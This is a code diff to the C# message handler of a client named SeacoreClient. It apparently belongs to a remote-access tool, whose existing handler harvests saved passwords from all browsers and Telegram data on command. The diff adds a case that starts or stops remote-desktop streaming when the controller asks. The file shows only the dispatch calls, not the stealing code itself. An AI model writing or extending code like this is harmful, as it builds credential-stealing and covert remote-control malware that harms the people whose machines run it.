@@ -1,7 +1,9 @@
-﻿using SeacoreClient.Features.Recovery.Messenger.Telegram;
-using SeacoreClient.Features.Recovery.Browsers;
-using SeacoreCommon.Messages;
+using System;
 using SeacoreClient.Core;
+using SeacoreClient.Features.RemoteDesktop;
+using SeacoreClient.Features.Recovery.Browsers;
+using SeacoreClient.Features.Recovery.Messenger.Telegram;
+using SeacoreCommon.Messages;
 
 namespace SeacoreClient.Handlers
 {
@@ -27,6 +29,17 @@ namespace SeacoreClient.Handlers
                 case ChromiumRecoveryMessage:
                     BrowserRecoveryManager.RecoverPasswordsForAllBrowsers();
                     TelegramRecovery.Telegram();
+                    break;
+
+                case RemoteDesktopRequestMessage remoteRequest:
+                    if (remoteRequest.IsStart)
+                    {
+                        RemoteDesktopStreamer.Start(clientManager, remoteRequest);
+                    }
+                    else
+                    {
+                        RemoteDesktopStreamer.Stop();
+                    }
                     break;
 
                 default:
